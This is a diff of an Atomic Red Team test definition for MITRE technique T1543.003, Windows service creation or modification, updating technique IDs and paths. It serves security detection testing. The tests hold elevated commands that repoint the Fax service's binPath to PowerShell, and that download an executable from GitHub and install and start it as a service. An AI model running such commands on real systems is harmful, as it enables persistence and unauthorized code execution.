@@ -1,6 +1,5 @@
----
 attack_technique: T1543.003
-display_name: "Create or Modify System Process: Windows Service"
+display_name: Create or Modify System Process: Windows Service
 
 atomic_tests:
 - name: Modify Fax service to run PowerShell
@@ -8,9 +7,7 @@ atomic_tests:
   description: |
     This test will temporarily modify the service Fax by changing the binPath to PowerShell
     and will then revert the binPath change, restoring Fax to its original state.
-
     Upon successful execution, cmd will modify the binpath for `Fax` to spawn powershell. Powershell will then spawn.
-
   supported_platforms:
     - windows
 
@@ -18,7 +15,7 @@ atomic_tests:
     name: command_prompt
     elevation_required: true
     command: |
-      sc config Fax binPath= "C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -noexit -c \"write-host 'T1031 Test'\""
+      sc config Fax binPath= "C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -noexit -c \"write-host 'T1543.003 Test'\""
       sc start Fax
     cleanup_command:
       sc config Fax binPath= "C:\WINDOWS\system32\fxssvc.exe" >nul 2>&1
@@ -27,16 +24,14 @@ atomic_tests:
   auto_generated_guid: 981e2942-e433-44e9-afc1-8c957a1496b6
   description: |
     Download an executable from github and start it as a service.
-
     Upon successful execution, powershell will download `AtomicService.exe` from github. cmd.exe will spawn sc.exe which will create and start the service. Results will output via stdout.
-
   supported_platforms:
     - windows
   input_arguments:
     binary_path:
       description: Name of the service binary, include path.
       type: Path
-      default: PathToAtomicsFolder\T1050\bin\AtomicService.exe
+      default: PathToAtomicsFolder\T1543.003\bin\AtomicService.exe
     service_name:
       description: Name of the Service
       type: String
@@ -50,8 +45,7 @@ atomic_tests:
         if (Test-Path #{binary_path}) {exit 0} else {exit 1}
       get_prereq_command: |
         New-Item -Type Directory (split-path #{binary_path}) -ErrorAction ignore | Out-Null
-        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1050/bin/AtomicService.exe" -OutFile "#{binary_path}"
-
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe" -OutFile "#{binary_path}"
   executor:
     name: command_prompt
     elevation_required: true
@@ -61,21 +55,18 @@ atomic_tests:
     cleanup_command: |
       sc.exe stop #{service_name} >nul 2>&1
       sc.exe delete #{service_name} >nul 2>&1
-
 - name: Service Installation PowerShell
   auto_generated_guid: 491a4af6-a521-4b74-b23b-f7b3f1ee9e77
   description: |
       Installs A Local Service via PowerShell.
-
       Upon successful execution, powershell will download `AtomicService.exe` from github. Powershell will then use `New-Service` and `Start-Service` to start service. Results will be displayed.
-
   supported_platforms:
     - windows
   input_arguments:
     binary_path:
       description: Name of the service binary, include path.
       type: Path
-      default: PathToAtomicsFolder\T1050\bin\AtomicService.exe
+      default: PathToAtomicsFolder\T1543.003\bin\AtomicService.exe
     service_name:
       description: Name of the Service
       type: String
@@ -89,8 +80,7 @@ atomic_tests:
         if (Test-Path #{binary_path}) {exit 0} else {exit 1}
       get_prereq_command: |
         New-Item -Type Directory (split-path #{binary_path}) -ErrorAction ignore | Out-Null
-        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1050/bin/AtomicService.exe" -OutFile "#{binary_path}"
-
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe" -OutFile "#{binary_path}"
   executor:
     name: powershell
     elevation_required: true
